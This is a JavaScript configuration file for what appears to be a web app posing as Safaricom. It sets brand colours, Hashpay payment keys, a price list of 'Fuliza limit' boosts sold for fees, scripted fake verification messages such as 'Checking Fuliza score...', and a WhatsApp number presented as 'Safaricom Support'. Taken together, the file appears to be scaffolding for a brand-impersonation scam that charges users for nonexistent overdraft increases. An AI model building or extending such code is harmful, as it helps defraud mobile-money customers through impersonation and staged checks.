// Safaricom brand colors
const SAFARICOM_GREEN = '#49aa33';
const SAF_MINT = '#eafcf1';
const SAF_PRIMARY = '#1e293b';

// API Configuration
export const API_BASE = import.meta.env.VITE_API_BASE || window.location.origin;

// Hashpay Configuration (Replace with your actual Hashpay credentials)
export const HASHPAY_CONFIG = {
  merchantId: import.meta.env.VITE_HASHPAY_MERCHANT_ID || 'YOUR_HASHPAY_MERCHANT_ID',
  apiKey: import.meta.env.VITE_HASHPAY_API_KEY || 'YOUR_HASHPAY_API_KEY',
  environment: import.meta.env.VITE_HASHPAY_ENV || 'sandbox', // 'sandbox' or 'production'
};

// Fuliza Limits Data
export const LIMITS_DATA = [
  { amt: 5000, fee: 200, tags: [], type: 'standard' },
  { amt: 10000, fee: 350, tags: [], type: 'standard' },
  { amt: 15000, fee: 530, tags: [], type: 'standard' },
  { amt: 20000, fee: 700, tags: [], type: 'standard' },
  { amt: 25000, fee: 1050, tags: [], type: 'standard' },
  { amt: 30000, fee: 1500, tags: [], type: 'standard' },
  { amt: 35000, fee: 2000, tags: ['instant', 'hot'], type: 'standard' },
  { amt: 45000, fee: 2499, tags: ['instant', 'hot'], type: 'standard' },
  { amt: 55000, fee: 625, type: 'hero' },
  { amt: 50000, fee: 3000, tags: ['instant'], type: 'standard' },
  { amt: 60000, fee: 3500, tags: ['instant'], type: 'standard' },
  { amt: 65000, fee: 4500, tags: ['instant'], type: 'standard' },
  { amt: 70000, fee: 5000, tags: ['instant'], type: 'standard' },
  { amt: 72000, fee: 6500, tags: [], type: 'standard' },
  { amt: 75000, fee: 6999, tags: [], type: 'standard' }
];

// Verification steps
export const VERIFICATION_STEPS = [
  "Connecting to Safaricom...",
  "Checking M-Pesa profile...",
  "Checking Fuliza score...",
  "Generating approval..."
];

// Payment status constants
export const PAYMENT_STATUS = {
  PENDING: 'pending',
  COMPLETED: 'completed',
  FAILED: 'failed',
  PREPARING: 'preparing'
};

// Support contact
export const SUPPORT = {
  phone: '0722000000',
  whatsapp: '254743225483',
  whatsappMessage: 'Hello%20Safaricom%20Support,%20I%20have%20completed%20my%20Fuliza%20Plus%20verification.%20Please%20assist%20with%20my%20limit%20boost.'
};

export { SAFARICOM_GREEN, SAF_MINT, SAF_PRIMARY };